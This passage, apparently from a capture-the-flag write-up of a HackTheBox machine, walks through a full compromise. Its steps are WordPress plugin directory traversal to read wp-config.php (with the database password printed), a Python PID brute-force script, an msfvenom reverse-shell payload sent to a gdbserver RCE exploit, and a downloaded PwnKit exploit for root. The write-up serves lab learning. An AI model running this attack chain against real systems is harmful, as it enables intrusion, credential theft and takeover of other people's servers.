</code></pre></div><p>Gobuster found some interesting files , Going through one by one, Found that <code>/wp-admin</code> has a login panel and <code>/wp-includes</code> has Directory listing available which listed all the backend files inside that directory. Nothing interesting is available there.</p><p><img src=/assets/Pasted%20image%2020220318233517.png alt="assets/Pasted image 20220318233517.png"></p><p>Since we know that the website uses WordPress, let’s run <strong>wpscan</strong> to gather more information and possible vulnerabilities.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>wpscan -e vp --plugins-detection aggressive --plugins-version-detection aggressive --url http://www.backdoor.htb --disable-tls-checks --api-token &lt;API_TOKEN_KEY&gt;
</code></pre></div><p>Going through the result , Found something interesting.
There is a vulnerable plugin <strong>ebook-download</strong> which has a directory traversal vulnerability.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Checking Plugin Versions <span style=color:#f92672>(</span>via Aggressive Methods<span style=color:#f92672>)</span>

<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> Plugin<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> Identified:

<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> akismet
 | Location: http://www.backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |
 | Found By: Known Locations <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
 |  - http://www.backdoor.htb/wp-content/plugins/akismet/, status: 403
 |
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> <span style=color:#ae81ff>1</span> vulnerability identified:
 |
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting <span style=color:#f92672>(</span>XSS<span style=color:#f92672>)</span>
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style=color:#f92672>=</span>CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> ebook-download
 | Location: http://www.backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://www.backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> The version is out of date, the latest version is 1.5
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Directory listing is enabled
 |
 | Found By: Known Locations <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
 |  - http://www.backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> <span style=color:#ae81ff>1</span> vulnerability identified:
 |
 | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Title: Ebook Download &lt; 1.2 - Directory Traversal
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/13d5d17a-00a8-441e-bda1-2fd2b4158a6c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style=color:#f92672>=</span>CVE-2016-10924
 |
 | Version: 1.1 <span style=color:#f92672>(</span>100% confidence<span style=color:#f92672>)</span>
 | Found By: Readme - Stable Tag <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
 |  - http://www.backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
 |  - http://www.backdoor.htb/wp-content/plugins/ebook-download/readme.txt

</code></pre></div><p>Accessing the <em>ebook-download</em> Folder &mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>http://www.backdoor.htb/wp-content/plugins/ebook-download/
</code></pre></div><p><img src=/assets/Pasted%20image%2020220319011821.png alt="assets/Pasted image 20220319011821.png"></p><p>There is nothing interesting, Tried to find ebook plugin exploit&mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>searchsploit ebook wordpress
</code></pre></div><p><img src=/assets/Pasted%20image%2020220319012102.png alt="assets/Pasted image 20220319012102.png"></p><p>Found a exploit, Let&rsquo;s try to use the exploit..</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>searchsploit -m <span style=color:#ae81ff>39575</span> <span style=color:#f92672>&amp;&amp;</span> cat 39575.txt
</code></pre></div><p><img src=/assets/Pasted%20image%2020220319012340.png alt="assets/Pasted image 20220319012340.png"></p><p>We can use the LFI vulnerability to download files and check there content.</p><p>Let&rsquo;s try if LFI is working as expected.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>curl http://www.backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style=color:#f92672>=</span>../../../wp-config.php
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>└─# curl http://www.backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span style=color:#f92672>=</span>../../../wp-config.php

../../../wp-config.php../../../wp-config.php../../../wp-config.php&lt;?php

/**
 * The base configuration <span style=color:#66d9ef>for</span> WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don<span style=color:#e6db74>&#39;t have to use the web site, you can copy this file to &#34;wp-config.php&#34;
</span><span style=color:#e6db74> * and fill in the values.
</span><span style=color:#e6db74> *
</span><span style=color:#e6db74> * This file contains the following configurations:
</span><span style=color:#e6db74> *
</span><span style=color:#e6db74> * * MySQL settings
</span><span style=color:#e6db74> * * Secret keys
</span><span style=color:#e6db74> * * Database table prefix
</span><span style=color:#e6db74> * * ABSPATH
</span><span style=color:#e6db74> *
</span><span style=color:#e6db74> * @link https://wordpress.org/support/article/editing-wp-config-php/
</span><span style=color:#e6db74> *
</span><span style=color:#e6db74> * @package WordPress
</span><span style=color:#e6db74> */
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>// ** MySQL settings - You can get this info from your web host ** //
</span><span style=color:#e6db74>/** The name of the database for WordPress */
</span><span style=color:#e6db74>define( &#39;</span>DB_NAME<span style=color:#e6db74>&#39;, &#39;</span>wordpress<span style=color:#e6db74>&#39; );
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>/** MySQL database username */
</span><span style=color:#e6db74>define( &#39;</span>DB_USER<span style=color:#e6db74>&#39;, &#39;</span>wordpressuser<span style=color:#e6db74>&#39; );
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>/** MySQL database password */
</span><span style=color:#e6db74>define( &#39;</span>DB_PASSWORD<span style=color:#e6db74>&#39;, &#39;</span>MQYBJSaD#DxG6qbm<span style=color:#960050;background-color:#1e0010>&#39;</span> <span style=color:#f92672>)</span>;                      

</code></pre></div><p>LFI is working as expected and we have accessed the wp-config.php file, Going through the content we also found the credentials, Tried to login on wordpress wp-admin.php but got no success.</p><p>I was out of ideas for now, Tried to read many blogs related to LFI to RCE and found few</p><p>We can try to read interesting files using LFI , which can provide us access to the server.</p><p>Few things we can try &mldr;</p><ul><li>Accessing SSH Private key to gain access through ssh</li><li>We can try Log Poisioning to gain RCE</li><li>Brute Forcing Linux Directories to find possible LFI to RCE Logs Directories</li><li>Accessing /etc/passwd and /etc/shadow and bruteforcing the credentials.</li><li>Checking out the running processes by bruteforcing /proc/PID/cmdline directory.</li><li>Trying to exploit the PORT 1337 by exploiting running process and learning about the service name and process.</li></ul><p>Trying all methods one by one , Most of them didn&rsquo;t worked out and also didn&rsquo;t found any Log File to Achieve log poisioning.</p><p>PID bruteforcing using LFI worked out pretty well and found the 1337 Port service.</p><p>Let&rsquo;s Bruteforce the PID and try to find the running processes.
We can use the Burp Suite Intruder or Python Script.</p><p>Let&rsquo;s Use Below python script to Bruteforce the PID to find the Running Process.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/python3 
</span><span style=color:#75715e></span>import signal
import requests
import sys

from pwn import *

def def_handler<span style=color:#f92672>(</span>sig, frame<span style=color:#f92672>)</span>:
    print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\n[!] Stopping the process...\n&#34;</span><span style=color:#f92672>)</span>
    sys.exit<span style=color:#f92672>(</span>1<span style=color:#f92672>)</span>

<span style=color:#75715e># Ctrl+C signal.signal(signal.SIGINT, def_handler)</span>

<span style=color:#75715e># Global variables main_url = &#34;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/&#34;</span>
empty_resp <span style=color:#f92672>=</span> 125

p1 <span style=color:#f92672>=</span> log.progress<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Brute force&#34;</span><span style=color:#f92672>)</span>
p1.status<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Starting brute force attack&#34;</span><span style=color:#f92672>)</span>

<span style=color:#66d9ef>for</span> pid in range<span style=color:#f92672>(</span>0,5000<span style=color:#f92672>)</span>:
    p1.status<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Testing pid %d&#34;</span> % <span style=color:#f92672>(</span>pid<span style=color:#f92672>)</span><span style=color:#f92672>)</span>
    content <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>requests.get<span style=color:#f92672>(</span>main_url + str<span style=color:#f92672>(</span>pid<span style=color:#f92672>)</span> + <span style=color:#e6db74>&#34;/cmdline&#34;</span><span style=color:#f92672>)</span><span style=color:#f92672>)</span>.content
    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>len<span style=color:#f92672>(</span>content<span style=color:#f92672>)</span> &gt; empty_resp<span style=color:#f92672>)</span>:
        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[+] Process {pid} found&#34;</span><span style=color:#f92672>)</span>
        print<span style=color:#f92672>(</span>content<span style=color:#f92672>)</span>
        print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;--------------------------------------------\n&#34;</span><span style=color:#f92672>)</span>
</code></pre></div><p>We got the following result.</p><p><img src=/assets/Pasted%20image%2020220321013122.png alt="assets/Pasted image 20220321013122.png"></p><p>PID 862 is running the Port 1337 on <em>gdbserver</em> .
Let&rsquo;s try to find Some Possible Exploitation Method for this service <em>gdbserver</em>.</p><p><img src=/assets/Pasted%20image%2020220321023920.png alt="assets/Pasted image 20220321023920.png"></p><p>We found Possible RCE (Remote Code Execution) , Let&rsquo;s see if the service is vulnerable to this exploit.</p><hr><h1 id=gaining-a-foothold>Gaining a Foothold</h1><p>From the Exploit Code , We got the instruction&mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>Usage: python3 <span style=color:#f92672>{</span>sys.argv<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span><span style=color:#f92672>}</span> &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt;

Example:
- Victim<span style=color:#e6db74>&#39;s gdbserver   -&gt;  10.10.10.200:1337
</span><span style=color:#e6db74>- Attacker&#39;</span>s listener  -&gt;  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style=color:#f92672>=</span>10.10.10.100 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span> PrependFork<span style=color:#f92672>=</span>true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 <span style=color:#f92672>{</span>sys.argv<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span><span style=color:#f92672>}</span> 10.10.10.200:1337 rev.bin

</code></pre></div><p>Let&rsquo;s first create the reverse shell &mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>msfvenom  -p linux/x64/shell_reverse_tcp LHOST<span style=color:#f92672>=</span>10.10.14.13 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span> PrependFork<span style=color:#f92672>=</span>true -o rev.bin
</code></pre></div><p>Let&rsquo;s Fire up the exploit&mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>python3 50539.py 10.10.11.125:1337 rev.bin
</code></pre></div><p><img src=/assets/Pasted%20image%2020220321024900.png alt="assets/Pasted image 20220321024900.png"></p><p>We got the Reverse Shell.</p><p>Let&rsquo;s grab the User Flag&mldr;</p><p><img src=/assets/Pasted%20image%2020220321025230.png alt="assets/Pasted image 20220321025230.png"></p><p>We don&rsquo;t have root access , So its time to escalate Privilege.</p><hr><h1 id=privilege-escalation>Privilege Escalation</h1><p>Let&rsquo;s run the Linpeash to find some possible Privilege escalation vectors.</p><p>We got the following Results and found that the machine is possibly vulnerable to CVE-2021-4034 , CVE-2021-3156 and others.</p><p><img src=/assets/Pasted%20image%2020220321030722.png alt="assets/Pasted image 20220321030722.png"></p><p>Let&rsquo;s first try to use PWNKIT CVE,
Download the Python3 Pwnkit Exploit as the target have python installed.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
</code></pre></div><p>Transfer the exploit to target machine by any methods.</p><p>Fire Up the exploit in the target machine and wait for Root Shell to Popup.</p><p><img src=/assets/Pasted%20image%2020220321031813.png alt="assets/Pasted image 20220321031813.png"></p><p>We got the Root Shell..</p><p>Let&rsquo;s Grab the Root Flag As well.</p><p><img src=/assets/Pasted%20image%2020220321032717.png alt="assets/Pasted image 20220321032717.png"></p><h6 id=thank-you-for-reading>Thank You For Reading</h6><hr></div></article><hr><div class=post-info></div></main></div><footer class=footer><div class=footer__inner></div><div class=footer__inner><div class=footer__content><span></span><span>Made with 💛 by <a href=/>An0nud4y</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js integrity="sha512-3HFukJLJggt3+W2ilNASCu6xibW86pdSMJ6+on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script></body></html>